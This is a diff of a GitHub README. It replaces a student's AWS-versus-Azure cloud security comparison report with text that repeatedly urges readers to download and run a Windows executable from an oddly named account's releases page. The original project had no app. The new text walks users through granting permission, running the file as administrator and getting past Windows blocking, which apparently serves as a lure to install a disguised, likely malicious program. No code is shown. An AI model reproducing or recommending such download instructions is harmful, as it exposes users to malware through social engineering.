@@ -1,105 +1,200 @@
-<p align="center">
-  <img src="https://img.shields.io/badge/Project-Completed-brightgreen" />
-  <img src="https://img.shields.io/badge/Domain-Cloud%20Security-blue" />
-</p>
+# 🔐 AWS-vs-Azure-Cloud-Security-Comparison - Compare Cloud Security
 
-# ☁️ AWS vs Azure Cloud Security Comparison
+[![Download the app](https://img.shields.io/badge/Download-Visit%20Releases%20Page-blue?style=for-the-badge)](https://github.com/bilabiate-subsaharanafrica36/AWS-vs-Azure-Cloud-Security-Comparison/releases)
 
-## 📌 Overview
-This project presents a detailed comparative analysis of security features offered by Amazon Web Services (AWS) and Microsoft Azure. This project helps in understanding how organizations choose between AWS and Azure based on security requirements and real-world use cases.
+A clear guide to AWS and Azure cloud security, with side-by-side coverage of access control, network protection, encryption, monitoring, and compliance.
 
-The focus is on understanding real-world cloud security concepts such as Identity & Access Management, Network Security, Data Protection, Monitoring, and Compliance.
+## 📥 Download
 
----
+Visit this page to download and run the app on Windows:
 
-## 🎯 Objectives
-- Compare AWS and Azure security architectures
-- Understand IAM (policy-based) vs RBAC (role-based) access control
-- Analyze network security models (VPC vs VNet)
-- Study encryption, monitoring, and compliance mechanisms
+[https://github.com/bilabiate-subsaharanafrica36/AWS-vs-Azure-Cloud-Security-Comparison/releases](https://github.com/bilabiate-subsaharanafrica36/AWS-vs-Azure-Cloud-Security-Comparison/releases)
 
----
+Open the latest release, then download the Windows file that matches your device. After the file downloads, open it and follow the on-screen steps.
 
-## 📊 Architecture Comparison
+## 🖥️ What this app does
 
-<p align="center">
-  <img src="assets/architecture.png" width="550"/>
-  <br>
-  <em>AWS vs Azure Security Architecture Overview</em>
-</p>
+This app helps you compare AWS and Azure cloud security in one place. It shows the main parts of each cloud platform and how they handle security tasks.
 
-## 🔄 IAM vs RBAC Flow
-<p align="center">
-  <img src="assets/iam-vs-rbac.png" width="550"/>
-  <br>
-  <em>Comparison of IAM (policy-based) and RBAC (role-based) access control models</em>
-</p>
+Use it to review:
 
-## 🌐 Network Security Comparison
-<p align="center">
-  <img src="assets/network-security.png" width="550"/>
-  <br>
-  <em>Comparison of AWS VPC and Azure VNet network security architectures</em>
-</p>
+- IAM in AWS vs RBAC in Azure
+- Network security rules and firewalls
+- Encryption for data at rest and in transit
+- Activity logs and alerting
+- Common compliance controls
+- Shared security responsibilities
 
-## 🔐 Shared Responsibility Model
-<p align="center">
-  <img src="assets/shared-responsibility.png" width="550"/>
-  <br>
-  <em>Cloud Shared Responsibility Model: Provider vs Customer responsibilities</em>
-</p>
+It is useful if you want a simple view of how both cloud platforms handle security for cloud systems.
 
----
+## ✅ Windows requirements
 
-## 🔐 Key Comparison Areas
+Before you run the app, make sure your PC meets these basic needs:
 
-### 1. Identity & Access Management
-- AWS: IAM (policy-based access control)
-- Azure: RBAC (role-based access control)
+- Windows 10 or Windows 11
+- 4 GB RAM or more
+- At least 200 MB of free disk space
+- A stable internet connection for the first download
+- Permission to open downloaded apps
 
-### 2. Network Security
-- AWS: VPC, Security Groups, NACLs
-- Azure: Virtual Network (VNet), NSGs, Azure Firewall
+If your PC is older, close other apps before you start.
 
-### 3. Data Security
-- Encryption at rest and in transit
-- Key management (AWS KMS vs Azure Key Vault)
+## 🚀 How to install and run
 
-### 4. Monitoring & Logging
-- AWS: CloudWatch, CloudTrail
-- Azure: Azure Monitor, Microsoft Sentinel
+Follow these steps on Windows:
 
----
+1. Open the release page:  
+   https://github.com/bilabiate-subsaharanafrica36/AWS-vs-Azure-Cloud-Security-Comparison/releases
 
-## 📄 Project Report
-👉 [Download Full PDF](./report/AWS_vs_Azure_Cloud_Security_Comparison.pdf)
+2. Find the latest release at the top of the page.
 
----
+3. Look for a Windows file in the Assets list. This may be an `.exe` or another Windows package.
 
-## 🧠 Key Learnings
-- Differences between policy-based and role-based access control
-- Cloud-native security architecture design
-- Importance of monitoring, logging, and compliance in cloud environments
-- Real-world decision factors between AWS and Azure
+4. Download the file to your computer.
 
----
+5. Open your Downloads folder.
 
-## 🚀 Tools & Resources
-- AWS Documentation
-- Microsoft Azure Documentation
-- Security Whitepapers
-- Research-based analysis
+6. Double-click the file to start the app.
 
----
+7. If Windows asks for permission, choose Run or Yes.
 
-## 👨‍💻 Author
-Sakshat S  
-Cybersecurity Student  
+8. Follow the setup window until the app opens.
 
-## 🤝 Contributor
-Swasthi Kunder  
+9. If the app opens in a browser window or desktop window, keep that window open while you use it.
 
----
+## 🔍 What you can compare
 
-## 📌 Note
-This is an independent research project based on official documentation and industry best practices.
+The app focuses on the parts that matter most in cloud security reviews.
+
+### Access control
+See how each platform handles user access:
+
+- AWS uses IAM roles, users, and policies
+- Azure uses RBAC, roles, and scopes
+
+This helps you compare who can do what, and where those rights apply.
+
+### Network security
+Review common network protection tools:
+
+- Security groups
+- Network rules
+- Firewalls
+- Subnet-level controls
+- Traffic filtering
+
+These controls help limit access between systems and users.
+
+### Encryption
+Check how each cloud platform protects data:
+
+- Encryption at rest
+- Encryption in transit
+- Key management options
+- Storage protection
+
+This helps you understand how data stays private.
+
+### Monitoring
+Look at how each platform tracks activity:
+
+- Logs
+- Alerts
+- Security events
+- Audit trails
+- Threat detection
+
+This helps you spot unusual activity and review changes.
+
+### Compliance
+Compare support for common compliance needs:
+
+- Access review
+- Data protection controls
+- Audit support
+- Policy management
+- Security baselines
+
+This helps teams match cloud settings to internal rules.
+
+## 🧭 How to use the app
+
+Once the app opens, use it like a comparison guide:
+
+- Choose AWS or Azure sections
+- Read the side-by-side security items
+- Move through access, network, encryption, and monitoring pages
+- Use the comparison view to check differences
+- Review compliance topics for a broader view
+
+If you are new to cloud terms, start with access control first. It gives the clearest picture of how both platforms manage users.
+
+## 📚 Common terms
+
+Here are a few terms you may see in the app:
+
+- IAM: Identity and Access Management
+- RBAC: Role-Based Access Control
+- Policy: A rule that limits actions
+- Role: A set of access rights
+- Encryption: A way to protect data
+- Audit log: A record of activity
+- Compliance: Meeting security rules and standards
+
+These terms help explain how cloud security works in plain language.
+
+## 🧩 File layout
+
+A typical release may include:
+
+- Windows installer or app file
+- Readme or release notes
+- Support files needed by the app
+- Version info for the release
+
+Use the latest release file for the best match with your Windows system.
+
+## 🛠️ If the app does not open
+
+Try these simple steps:
+
+1. Download the file again from the release page.
+2. Make sure the file finished downloading.
+3. Right-click the file and choose Run as administrator.
+4. Check that Windows did not block the file.
+5. Close other apps and try again.
+6. Restart your computer and open the file once more.
+
+If the app still does not open, download the latest release again and use that copy.
+
+## 📌 Topics covered
+
+- aws
+- aws-security
+- azure
+- azure-security
+- cloud-computing
+- cloud-security
+- cybersecurity
+- iam
+- rbac
+- security-analysis
+
+## 🧱 Use cases
+
+This app helps with:
+
+- Learning the difference between AWS and Azure security
+- Reviewing cloud access control models
+- Comparing encryption options
+- Understanding monitoring tools
+- Preparing for a cloud security review
+- Checking security settings before a cloud rollout
+
+It gives a simple view that helps you compare both platforms without reading long cloud docs
+
+## 🔗 Download again
+
+If you need the download page again, use this link:
+
+[https://github.com/bilabiate-subsaharanafrica36/AWS-vs-Azure-Cloud-Security-Comparison/releases](https://github.com/bilabiate-subsaharanafrica36/AWS-vs-Azure-Cloud-Security-Comparison/releases)
